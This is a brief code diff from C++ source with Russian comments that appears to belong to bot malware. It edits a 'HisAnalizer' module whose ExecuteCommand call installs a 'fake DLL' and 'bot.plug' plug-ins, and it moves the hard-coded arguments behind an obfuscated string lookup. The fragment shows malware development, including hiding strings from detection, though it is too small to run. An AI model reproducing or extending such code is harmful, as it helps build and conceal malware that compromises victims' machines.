@@ -578,6 +578,8 @@ void HisAnalizer::StartAnalizerThread(PCHAR URL)
 namespace HisAnalizer
 {
 
+
+
 	//--------------------------------------------------
 	//  Функция загружает список обрабатываемых ссылок
 	//--------------------------------------------------
@@ -673,7 +675,8 @@ namespace HisAnalizer
 		if (Executed)
 		{
 			#ifndef AGENTFULLTEST
-				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(), "dll.plug bot.plug", false);
+				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(),
+									 GetStr(StrHistoryAnalizerCommandParams).t_str(), false);
 			#endif
         }
 
